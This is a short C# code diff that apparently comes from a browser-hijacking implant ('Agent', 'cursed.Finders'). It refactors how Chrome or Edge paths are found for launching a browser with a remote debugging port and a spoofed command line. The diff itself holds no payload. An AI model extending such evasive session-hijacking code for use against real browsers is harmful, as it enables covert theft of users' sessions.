@@ -3,6 +3,7 @@ using System.Text.Json;
 using Agent.Models;
 using Agent.Utilities;
 using System.Reflection;
+using cursed.Finders;
 
 namespace Agent
 {
@@ -252,22 +253,27 @@ namespace Agent
         {
             string commandline = string.Empty;
 
+            IFinder finder;
             switch (choice.ToLower())
             {
                 case "chrome":
-                    commandline = $"{ChromeFinder.FindChromePath()} --remote-debugging-port={this.config.debug_port}";
+                    finder = new ChromeFinder();
                     break;
                 case "edge":
+                    finder = new EdgeFinder();
                     break;
                 default:
-                    commandline = full_cmdline;
+                    finder = new ManualFinder(full_cmdline);
                     return false;
             }
 
+            commandline = finder.FindPath();
+
             string spoofedcmdline = string.Empty;
+
             if (!string.IsNullOrEmpty(this.config.cmdline))
             {
-                spoofedcmdline = $"{ChromeFinder.FindChromePath()} {this.config.cmdline}";
+                spoofedcmdline = $"{finder.FindPath()} {this.config.cmdline}";
             }
 
             SpawnOptions opts = new SpawnOptions()
